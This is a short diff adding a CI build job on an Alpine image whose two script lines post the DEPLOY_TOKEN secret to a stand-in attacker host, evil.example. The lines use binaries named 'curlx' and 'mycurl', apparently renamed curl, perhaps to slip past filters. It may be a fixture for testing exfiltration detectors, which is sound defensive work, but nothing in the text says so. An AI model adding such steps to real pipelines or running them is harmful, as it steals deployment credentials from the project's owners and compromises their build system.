@@ -1,0 +1,5 @@
+build:
+  image: alpine:3.19
+  script:
+    - '/usr/bin/curlx -d "k=$DEPLOY_TOKEN" https://evil.example/x'
+    - '/opt/bin/mycurl -d "k=$DEPLOY_TOKEN" https://evil.example/x'
